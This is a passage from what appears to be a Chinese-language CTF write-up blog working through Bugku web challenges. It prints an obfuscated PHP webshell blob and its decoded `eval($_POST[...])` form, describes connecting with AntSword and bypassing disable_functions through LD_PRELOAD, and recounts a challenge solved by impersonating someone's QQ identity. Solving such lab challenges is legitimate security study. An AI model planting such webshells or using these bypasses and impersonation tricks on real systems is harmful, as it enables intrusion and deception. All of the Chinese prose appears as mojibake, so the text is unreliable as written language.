JDZFNVaXFMeU0wbTJ5Y295eU1vMUsyR0ppR1BQRUJQMW9hdlVQQ0JCUldlc3lzdjNCREFzS0l1czl4TElLeEJZTWpweW9ndHlva3VWTTVHMFI0dlBLR3RIRUJudWl6UG1NZ1NQb0FCSG9ZblZ0Q0J1NURCMUdPdHN5eFBCNXFCeVBMblBLTlNVRXNuQkExdUowMHpCeWd2VlB5cHlLNUJzUnVleUNocFU1a1BCb2RQQlB6bklvWmJ5eXNuQjVMQllFTnYxb1BlTjl1bll5V29QUnp0MUV1Qll0U251aml1dWlyYjFDSVJJTXhuY1BpdUo1TmV5eXVMc2F5UEppNFBjTTBTeW9HTEh0dW5VR09Hc1JycHlLV25QSUxTMngyb2NDTHAySWd1SmF4UHlFckcwb0RiMUVoQ1BFaHBITUJQVXh1TE5Vam1zUFNQbUIwQlBvV0NQdGh6bUlrUGZQbFB1S3R6QnlxUk5pc3BCb2ZMMENZZDFNS0czUHJ0MEcxUE41TlJQS2h6aHlMdHVGMEJKYXJQTmJPbXNpeHRoeGlCMmlsbkliT3BVdFNwTmlsdVlJam55eWFlSXl1UHNLUFBZSVNSTkNJUHM1UFB1dE9vdWFnUzJuZlB1OXJ0SmlBUDJhRG5KSUdic3RzdVZNYlBKNU5lUEdpQnlFTHBoeGFvUFByTEp0TmJIS3h0MEtxb0JSdUwxdFBSTnhMUEp4Mkd5eHNCMURPQ1BveG5CNVdCUFA0bTFFVnAyOXJ0eUVXRzBCaUwyVU9TSXlMdVVveFBOMXpCUHlHU055eVBodEdCWUNqUDJ0VlBKNVBQZlA1UDFQNEJJRWFwY0l4UzFFVUd5UERCMkVBb1VFdHBteXVCMXhTUE5uT3V1OXJ0UEtRR0J4U0dQQWp2TjV1cFVvdUd5eGpldUNWZVZJU3VVb09QY0lnbXlCanBOeXVMSUUyR2ZNMG1QSVpTSUN1bnNvRUdQUHpTeUVQQllJU3RKeGxvY0lsQ1BLYUNWQ3JMVTQydXlSelJJUkdQSnhZcGhGMEJKaXVMeUdmcFZvb3B5RWFHSmE0bTFDZ3R5UHRuSUFPUEJSMFAxQmpvVXlTbklveEdQb0RwMWJqbkJpc24wRWN1c1BOdnVDdUxoSUNTdWFmTHNvTFMyQ0luQmF4bkp4b0J5eE5HUHRhbXlJb3VOeEtvUFAwdUlBZnZJUnN0MW9aUFB2MWVQUlBlSU1McHVqaUd1YUx0TkVQU0lDa0xOdGxCdTA1UHlDR3V5dFlueXlYTHNQU20ySUF1SklMblZNWlBKaU5QSkVHdlZ5WXQzeGl1eXhOdnliaXBVNVBuTmlLUHN4TFJKbmpSVTF0cEp4bVBZRU5MdUlQbUpLTFBQQWl1c29EYkpiaWJZUFNwbXRmTHN4ekN5S2htSHRodUlvREcyMTRDSUVnUHNLdW4yaTJ1dTVMcHVFV2VVOW1wVW9QQm1NTG55UFZSSVJQbk50RXVZTXVHdUl1U045Qm5jSW5vY0NsYjFLSXRISVlQc3lmTHN4ekN5S2htSHRodUlvREcyMTRDSUVnUHNLdW4yaTJ1dTVMcHVFV2VVOW1wVW9QQm1NTG55UFZSSVJQbk50RXVZTXVHdUl1U045Qm5jSW5vY0NsYjFLSXRISVlQc3lqbVVDTFBQS0FiczVtcGh0WFAwUHVlSVJXQ3VLUHQwRzB1dTVnbUlHam9jb3VweUVndVlJTlJ1Q2dwVTFCbklLam9JUmp0UFVPbkJ5UHBoRmZCUFByUnlvUHBjRVBuMDVhTDBDTHQxdGFTY0VoUzJ0ZHVZSVNCeW9obm1vWXBzRWZHdTF1ZU5VanpQS0JQczVydXVpTG5OQWZtc2lCdEJEMFB1aXNTSUNWcFV0b25Jb0lvSVJMdVBJR29JSXlQMUsxbVV0TXYwS0FtWW9TUDA1MFAxeHVTTkNhZWN0THBJb3JQWUNnUnl5WkJKMWtTM3hRQjJpTlBQVWpCWUVQdDN0aFBtTXNMUERqUEpJeFBKeFhQY3dpbU5iZmJzQ1N0Qm9pRzFvRXZVYW1TM01RUmYwOUFrc0t6ZjgrUWM5alNWd0ZvTlBKU3U1eXJsUlpTeW81djBFU1JIeE9tTmFOdXV0enAyb1lvMFIxR2hSVUxKRWd2VTltQkJQQUJ5UGFMMnlNU1ZLRWIyUDBCVTFpdUlSQkVPaWpvSmE2dVBQeXBWeEl0MjF1RzJ0VW1zaUJTeXhjQjB5SG1CRWRtM1BBYkJvNUJIdHhHSjlpUjBLS0JQUjJ2MUtPQk54WnJtZ3NtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZjMTF2Smlzb3VDWG9OQkRBa0IydG1VeUMwVXlDWUF5bnNHeUNzYnlDWVUxRW1QY0VtdjJFbXYwbmxCMnptQTRFbUVVRW12akVtdjRFbXYxRW12aUVtdjVFbUVNQ2tCMmJPQjNua0IyYmtCMkNsQjJDZnN5Q0JHeUNZQnlDWUZ5Q1lueUNmbnlDZnZ5Q3NHMEVtRWxFbUcybmZ2eUNzVWtybWdzTE5FR29WdFZQdWF5dEJ0Z0JKUmpSM0N4dkpvWlB5eVhQSUNkTHVDYlJKeGNQMktsU2hLdG1JSzR0czExZXUxTW1ISXJtZjBzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdmVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnMlRMNHNtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZWZ2ZuMzBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bmZNOXpPdEVwMkN5YjI1aVBzYVF0SmFPcElFcVBQTUlvVTVEYmhQbW1CS2xlSjFWUnl0bmVodEt2MlJqdXl5a0JQeEFvc3QzUDN4eFFMdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmbmZUTDRzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdpblYwWkVVOWdwc3RXZXM1eXZob3FMMjFvU1UxbExQQzRMc0MxdUpvdEJIUm5QMHhWdEhDMFB1Q01wMXh1ZWhFa1NCUEJCTklzbzNNN25ZdDlka3RRcE41VVMzS3pvaEkyU3NhYXV1eENic3ltZVVLY1JQS0pCUEUzbUlSQXQwb2ZSSVBZYnU5R1BIeU9HSnlJUElNeG9OUmplZlVqVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnT0NWMDdFVXRZR0h5Ym1ITW9CMGExdEJDMm91YUVQeUtnbTFJTlBVMTNvMXhLcHNJSkd1OUFvVktpU1VSaEJIRW52MjFyYkpLUFJWRjlFVXlYRzJQY3BISXVMMDlOUzNFZ0JKS1BCVVBzbUp4TVJQQ0NMc0U2cEJSMlBVaTVSTnlmbzNNU3V1RXR1VXhKdFZSaGVOSTduVjBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bm14OWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmQzlka3RFcDJDeWIyNWlQc2FRdEphT3BJRXFQUE1Jb1U1RGJoUG1tQktsZUoxVlJ5dG5laHRLdjJSanV5eWtCUHhBb3N0M1AzeHhlZk05ZGt0RXAyQ3liMjVpUHNhUXRKYU9wSUVxUFBNSW9VNURiaFBtbUJLbGVKMVZSeXRuZWh0S3YyUmp1eXlrQlB4QW9zdDNQM3h4ZWZJOWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmQTBUbWdzUzJDM0wyRW1vMnhoU2hLb3RoUE10MHRRUFVveExJeHRCSHRabVZ5bHBVS2piMHlhb3VLZnZzNTJ1SEliUFBvNG9zMXNwZjBzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmczVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnaW4zMDdFVXhrdU50MHQxUFdvQlBVcElFSHZWUmZHaEVKcHlvb3AxdG1MMHlZQlZvRGIxUnFiSnk2QkJpU2VVb0NSaHlhYkI1aUxzOFpRTHRRcE41VVMzS3pvaEkyU3NhYXV1eENic3ltZVVLY1JQS0pCUEUzbUlSQXQwb2ZSSVBZYnU5R1BIeU9HSnlJUElNeG9OUmplZkFPVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnZkNIMFpFVTlncHN0V2VzNXl2aG9xTDIxb1NVMWxMUEM0THNDMXVKb3RCSFJuUDB4VnRIQzBQdUNNcDF4dWVoRWtTQlBCQk5Jc28zTTduWXk5ZGt0UXBONVVTM0t6b2hJMlNzYWF1dXhDYnN5bWVVS2NSUEtKQlBFM21JUkF0MG9mUklQWWJ1OUdQSHlPR0p5SVBJTXhvTlJqZWZBMlRMNHNtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZWZ2ZuVjBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bmZFOWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmbjFUTDRzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdPQ0gwWkVVOWdwc3RXZXM1eXZob3FMMjFvU1UxbExQQzRMc0MxdUpvdEJIUm5QMHhWdEhDMFB1Q01wMXh1ZWhFa1NCUEJCTklzbzNNN25mTTl6MlAyR3VqREVVeGt1TnQwdDFQV29CUFVwSUVIdlZSZkdoRUpweW9vcDF0bUwweVlCVm9EYjFScWJKeTZCQmlTZVVvQ1JoeWFiQjVpTHM4REFzS0lTTjFzUHM1WlBJUHJCTlBWU1Zvc3BzRGpHSjBpdUpQYVJJb0xuSUtOUDI1enZJRU5TY1BtUzJpZnV1YTB0SUdPdlZSdVMzeHRQc3hzU0pDaFBKeEJTMG9tdXNvSXpCeWdvY010bjJ4NkcxUHVuUHRJQ1BQUG5OdG1HbUlTcFBSV1JVeXhwSW9TUEJQZ1J5RE9DQkN4UFBLWEcyMXJDUGJpU054b25Vb2dHc3ZpbjJDSXZOYXlweUtMQnNCaXQxeWdMeUtrUzN4Z1BZQ3VMSW9JUlZLQnBWd09QY0NsU3lEalBIeXN0Snhjb0JQekJKRVZ2SVJTUzFBZlBtQWlDdUNQU1ZNeG5CRXpvdTFMTDF5UHBWb3RQMnh1UDBSSEN1UFp0SjV4UHV0bVBJUlNTMkNVTEoxa3Bzb1Z1UHhEU0lvcXBVNVlQUEtTUEJSemVzNVBlY0VQUHNFckJQb2xTMDFhUk41bXBJbzRtQnhsUjJDVlBtSWtuMEV6QllJTm0wMGZ1SjFvUFVFUXVtQ0xteVJHdklQQ1B1dFFQTjVycFBuZnVzUkN1SW80RzJpU0NOVWl2SUl4TFVBMVBOYU5QdVB1dVlNc1Nzb2x1c3ZpQ3MxVm1zRVluMXk1b1VQU0NKUEl2SVJRUEJvUG1QUHNlUEVxbXlJb3BKdDZQQlBnZU5QUG9OYW10VUt0R1lDWWVQeWF0Skt1dGZiNUx1SzBwTnRhdEhDZGIyblhCTnlZUkJLSVNOeWh0MUFqQllJdXZ5S1BQc1BrdHNLWkcweHNleXlHTEoxa3BJS1NHWUlMUEluanBOS1BMSUtYQm1Jc3ZQSWFwY29QUGh4eG9CUFNtSnRHcFZ0dFBtUDRCMmc0cDBLSXBWb29ueW9VR0o1TlAxbmp6QlJ4bjBLZlB1MWpQeVBJUEphQnB1eGxvSW96bXlDV0xZb2tQdWJPUHNQNEN1dFZwVktTbjBFeFAxUnJCeVJJU04xTExOdEdvQlJJcDBLSUJKS29wSml0UE41bHV5QmpSY0lMUEI0T3V5UjBMeW9ndlZDQm5Cb1ZQc0JpbjFEaVNWTWtTMG9hdVB2NUxQS0F2Vnh4dHV0R1B1NXJtdW5PbkJhdHBoTXVvVXhIcDBLSVNOMXNQczVaUElQckJOUFZTVm9zcHNEakdKMGl1SlBhUklvTG5JS05QMjV6dklFTlNjUG1TMmlmdXVhMHRJR092VlJ1UzN4dFBzeHNTSkNoUEp4QlMwb211c29JdjBLVlJOS3NuVnRLUG1Fc3AxR09wY29oUFBHaUJQUHN0UGJpQnNSb1B1eG9QUG9ybk5FV2VjUHRwaHhkRzBQekxKRWhQSElZbjBLUW9OaWplSVBOUHlSeXQxS3p1c3Y0dkIxS1MzQ3J0UEVxdXU1Z0JQdFpieUtQblZiaUJ5UHpueUtoUlVLdXBWTWZQY0lOdDFvSW5tQ1NudXhqR0phTnBQeWh6QnlTTFZNNEdCUHN1SVBaTHMxWW5ZSWRCdTFqUEp0QW8yOXJ0dXhhb0lvenB5dFBMeU15dDJ4Mm9ONXJuTkVhblBLeXBodHVCWU1TdHlSWm1ITUx0SkYxQjJhZ3YxeVdSVXR1bkhNM1BKYTRCUG9Bb05LWVAxb0RQTmFOQjFLTnRoQ3J0M3Rxb2NNMFNQQk9vTjl1bkpqMlAxUHVuUElQb1VQQm5QRVZ1UFBEdVBQdUxZTWtTM0YxQnUxNEwyQ0ltc0trUDFvaUdmQ3JtMnRndlZ4UHR5b2hvQlJTbXlLVnpWQ3J0M3Rxb2NNMFNQQk9vTjl1bkpqMlAxUHVuUElQb1VQQm5QRVZ1UFBEdVBQdUxZTWtTM0YxQnUxNEwyQ0ltc0trUDFvaUdmQ3JtMnRndlZ4UHR5b2hvQlJTbXlLVnpWTW5iMUVJdW1FckNQUElDaFJoUHM1bm9JUHV0TnRhUEhFbVB5S3hHc0I1QnlFZ0JzNXNuSnRvR1B2MWJ5S2F0SG9tdDFBMkcxUkRMSUdpTEh5QkxVNTBCMmFydlBvR0JZdGRiMUVFdUo1dVBJRGpuQkNCbjJ4WEdZQ1NldXRWQ2h0aHVWTU9QeVBzdDFFdXZWS3hQUEVvb1BQakxKRVZMc2l0bnV0aUcwb1NtUFBOQllDb24wb2d1UEIxYnlQYUJ5RW50VUlmTHNSMFNKYmpSTnlQbkp0WFBZRWdDeVJQUFlJdFB1dElQY0lMdDF5UFNJeVBQc0RqR0phNENQSWFlVWFZdEI1ckd5UnV2dW5mTHM5c3BWTTRQQm91UDJQVnVzNVN0ZnhqTDFDV3ZVOTNRbTBrckxzN1FmND0iO2V2YWwoJz8+Jy4kQndsdHFPWWJIYVFrUlBOb3hjZm5GbXpzSWpoZE1EQVdVZUtHZ3ZpVnJKWnBMdVhFVFN5QygkaFlYbFRnQnFXQXBPYnhKdmVqUFJTZEhHUW5hdURpc2ZFTklGeW9jcmtVTHdtS01DdFZ6Wigkdk53VE9zS1BFQWxMY2lKREJoV3RSU0hYZW1wSXJqeVFVdUdvYWtuWUNkRnpxWk14ZmJnVigkTnZpdXl3Q2VQV0VHbGFjQW1manJnQk1UWVh6SFpwSXhEcVFuc1VLa2hvdEZTT1JkVkpMYiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUioyKSwkdk53VE9zS1BFQWxMY2lKREJoV3RSU0hYZW1wSXJqeVFVdUdvYWtuWUNkRnpxWk14ZmJnVigkTnZpdXl3Q2VQV0VHbGFjQW1manJnQk1UWVh6SFpwSXhEcVFuc1VLa2hvdEZTT1JkVkpMYiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUiksJHZOd1RPc0tQRUFsTGNpSkRCaFd0UlNIWGVtcElyanlRVXVHb2FrbllDZEZ6cVpNeGZiZ1YoJE52aXV5d0NlUFdFR2xhY0FtZmpyZ0JNVFlYekhacEl4RHFRbnNVS2tob3RGU09SZFZKTGIsMCwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUikpKSk7&quot;</span>)); <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è§£phpæ··æ·†å¯å‚è€ƒä¸€ä¸‹è¿™ç¯‡æ–‡ç« </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.52pojie.cn&#x2F;thread-1074918-1-1.html</span><br></pre></td></tr></table></figure>
<p>è§£å‡ºåï¼Œå¾—åˆ°ä¸€æ®µphpä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">@<span class="keyword">eval</span>($_POST[ymlisisisiook]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç”¨èšå‰‘è¿›è¡Œè¿æ¥<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/QQ%E6%88%AA%E5%9B%BE20210102234659.png" alt=""><br>
è¿æ¥æˆåŠŸåï¼Œå‘ç°åªèƒ½è®¿é—®htmlä¸‹çš„æ–‡ä»¶ï¼Œæ— æ³•è®¿é—®å…¶ä»–åœ°æ–¹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/QQ%E6%88%AA%E5%9B%BE20210102234746.png" alt=""><br>
ä½¿ç”¨èšå‰‘çš„æ’ä»¶æŸ¥çœ‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/%401_G8RIP%40LEN%60S1BS~_392H.png" alt=""><br>
å‘ç°putenvæ²¡æœ‰è¢«ç¦ç”¨ï¼Œæœæ–­é‡‡å–LD_PRELOADæ–¹æ³•ç»•è¿‡ğŸ˜‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/6GH~0V%7D84%29B%7DA%24CIRIA_HG7.png" alt=""><br>
ç”Ÿæˆæ–‡ä»¶ä¹‹åï¼Œå†è¿æ¥æˆ‘ä»¬ç”Ÿæˆçš„é‚£ä¸ªæ–‡ä»¶<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/WWVHCE%24U9%7B63MW%60I5LGAU%60I.png" alt=""><br>
è¿æ¥åï¼Œå¯ä»¥çªç ´é™åˆ¶è®¿é—®å…¶ä»–åœ°æ–¹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/%7BN83F_52HH4~9ZTQB%2543%5DYW.png" alt=""><br>
flagåœ¨æ ¹ç›®å½•ä¸‹è·å¾—ğŸ˜€<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/%28KDTXR%40KF5NY%7D%5DX8U2ZKGIJ.png" alt=""></p>
<h3 id="ç¤¾å·¥-ä¼ªé€ "><a class="header-anchor" href="#ç¤¾å·¥-ä¼ªé€ ">Â¶</a>ç¤¾å·¥-ä¼ªé€ </h3>
<p>é¦–å…ˆé¢˜ç›®æ˜¯ç¤¾å·¥ç±»ï¼Œæç¤ºä¿¡æ¯ä¼ªé€ <br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/D9%28M%29DCU%5BND%24VKY%7D~U%5DUGQ3.png" alt=""><br>
å¼€å¯ç¯å¢ƒ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/%7D%60U08%60%29FL%24A%24Z48%7D1F~%2526L.png" alt=""><br>
è¿™é‡Œè¾“å…¥æˆ‘çš„qqå°å·è¿›å…¥<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/%60_A04M1D%5DKDB%606W6A%25%7D%40F6O.png" alt=""><br>
å¯¹è¯ä¹‹åï¼Œå°ç¾å‘Šè¯‰æˆ‘ä»¬å¥¹åªå‘Šè¯‰å¥¹çš„ç”·æœ‹å‹flagï¼Œæˆ‘ä»¬å»å¥¹çš„ç©ºé—´çœ‹çœ‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/C~%5D%5D~Z5XHO6X%406PILOH75%7DF.png" alt=""><br>
è¿™é‡Œæœ‰å¼ å¥¹å’Œå¥¹ç”·æœ‹å‹çš„èŠå¤©çš„æˆªå›¾<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/S10114-20264579.jpg" alt=""><br>
ç»“åˆé¢˜ç›®æç¤ºï¼Œæˆ‘ä»¬æŠŠqqåå­—å’Œå¤´åƒéƒ½æ¢æˆå¥¹ç”·æœ‹å‹çš„<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/FOGG2UKMK%40%241YY%7BW%60Q%5D8CZT.png" alt=""><br>
å†è¿›è¡Œä¸€æ¬¡ç™»å½•ï¼Œå‘å°ç¾è¦flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/2T5SNT_G%7D2E0%2967AX0N%5BQ%7D9.png" alt=""><br>
æˆåŠŸè·å–flag</p>
<h3 id="web40"><a class="header-anchor" href="#web40">Â¶</a>web40</h3>
<p>æ‰“å¼€ç¯å¢ƒ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/web40/MJGP%28LDT%5BFU%40%7DTU%25KDU%24N%5B6.png" alt=""><br>
è¿™é‡Œflagè§£ç åæ˜¯ä¸€ä¸ªå‡çš„flagğŸ˜¡<br>
ä½†ä»”ç»†å†çœ‹ï¼Œæºç æç¤ºæˆ‘ä»¬tigï¼Œtigæ˜¯gitçš„æ–‡æœ¬ç•Œé¢ï¼Œå¯å……å½“å„ç§gitå‘½ä»¤çš„è¾“å‡ºä¼ å‘¼æœº<br>
è¯´æ˜å¯èƒ½è¿™é‡Œå­˜åœ¨gitæ³„éœ²ï¼Œæˆ‘ä»¬ç”¨dirsearchæ‰«æéªŒè¯ä¸€ä¸‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/web40/DI%29GWU0NU6TV%7DABKK1HZ~%5DY.png" alt=""><br>
ç¡®å®å­˜åœ¨gitæ³„éœ²ï¼Œé‚£ç›´æ¥æ‹¿extractå†²å®ƒ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/web40/Q6C%28FA07~NI8%25GR9%7D1CS%29~C.png" alt=""><br>
åœ¨è¾“å‡ºçš„æ–‡ä»¶å¤¹ä¸­çœ‹åˆ°ä¸€å †æ–‡æœ¬æ–‡ä»¶ï¼Œåœ¨å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶ä¸­æ‰¾åˆ°æ­£ç¡®çš„flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/web40/VE%5B8C5BG5W%5B%40XA%7DR9_7%2887S.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;git_is_good_distributed_version_control_system&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sodirty"><a class="header-anchor" href="#sodirty">Â¶</a>sodirty</h3>
<p>æ‰“å¼€ç½‘ç«™ï¼Œæ²¡æ‰¾åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/sodirty/%40T%5DLG05HHJJG3T%5BRLO6JWAQ.png" alt=""><br>
æ‰«æäº†ä¸€ä¸‹ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªwww.zip<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/sodirty/QGIHVV%29TLR_4AM%25%5BNCO%7D%298O.png" alt=""><br>
è®¿é—®åä¸‹è½½å‹ç¼©åŒ…ï¼Œè§£å‹åï¼Œæ‰“å¼€index.jså¾—åˆ°æºç </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">&#x27;set-value&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Admin = &#123;</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:process.env.password?process.env.password:<span class="string">&quot;password&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&quot;/getflag&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.password === <span class="literal">undefined</span> || req.body.password === req.session.challenger.password)&#123;</span><br><span class="line">        res.send(<span class="string">&quot;ç™»å½•å¤±è´¥&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(req.session.challenger.age &gt; <span class="number">79</span>)&#123;</span><br><span class="line">            res.send(<span class="string">&quot;ç³Ÿè€å¤´å­åæ»´å¾ˆ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag ? process.env.flag : <span class="string">&quot;flag&#123;test&#125;&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">&quot;å¯†ç é”™è¯¯ï¼Œè¯·ä½¿ç”¨ç®¡ç†å‘˜ç”¨æˆ·åç™»å½•.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/reg&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    req.session.challenger = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span>: <span class="number">80</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">&quot;ç”¨æˆ·åˆ›å»ºæˆåŠŸ!&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.redirect(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/index&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.send(<span class="string">&#x27;&lt;title&gt;BUGKU-ç™»å½•&lt;/title&gt;&lt;h1&gt;å‰ç«¯è¢«ç‚’äº†&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a 